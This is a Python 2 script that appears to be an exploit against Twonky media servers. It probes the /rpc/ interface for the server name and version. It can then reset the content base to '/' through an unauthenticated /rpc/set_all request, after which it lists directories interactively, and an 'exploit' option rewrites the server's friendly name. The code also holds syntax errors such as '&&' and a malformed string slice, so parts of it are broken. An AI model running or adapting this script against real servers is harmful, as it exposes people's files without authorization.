import requests
import sys
import readline


if len(sys.argv) != 3:
	print "Usage: $ " + sys.argv[0] + "[IP_adress] [port]"
else:
	headers = {"Host" : "189.209.218.198:9000",
	"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0",
	"Accept" : "*/*",
	"Accept-Language" : "de,en-US;q=0.7,en;q=0.3",
	"Accept-Encoding" : "gzip, deflate",
	"Referer" : "http://189.209.218.198:9000/",
	"Content-Type" : "application/x-www-form-urlencoded",
	"X-Requested-With" : "XMLHttpRequest",}
	try:
		url = "http://" + str(sys.argv[1]) + ":" + str(sys.argv[2]) + "/rpc/get_friendlyname"
		friendlyname = requests.get(url, headers=headers)
		print "Server Name: %s"%friendlyname.text
		url = "http://" + str(sys.argv[1]) + ":" + str(sys.argv[2]) + "/rpc/info_status"
		version = requests.get(url, headers=headers)
		print "Twonky Version: %s"%version.text[version.text.find("version|"+8:)]
	except:
		print "*** Error while initializing ***"
	print "*** Twonky file system discovery ***"
	print "First time connected to this Server?"
	set_contentbase = raw_input("Set Content base to '/' default 'N'? [Y,N] ")
	if set_contentbase.upper() == "Y":
		payload = "\ncontentbase=/\n"
		url = "http://" + str(sys.argv[1]) + ":" + str(sys.argv[2]) + "/rpc/set_all"
		response = requests.post(url, data=payload, headers=headers)
		print response.request.headers
		if response.status_code != 200:
			print "*** Error status_code = " + str(response.status_code)
	else:
		while True:
			var = raw_input("path nr: ")
			if var != "exit" && var != "exploit":
				url = "http://" + str(sys.argv[1]) + ":" + str(sys.argv[2]) + "/rpc/dir/path=" + var
				try:
					response = requests.get(url)
					print "-" * 30
					print response.text
					print "-" * 30
				except:
					print "*** Error occured ***"
					sys.exit()
			elif var == "exploit":
				payload = "\nfriendlyname=WDMyCloud\n"
				url = "http://" + str(sys.argv[1]) + ":" + str(sys.argv[2]) + "/rpc/set_all"
				response = requests.post(url, data=payload, headers=headers)
				print response.request.headers
				if response.status_code != 200:
					print "*** Error status_code = " + str(response.status_code)
			elif var == "exit":
				sys.exit()
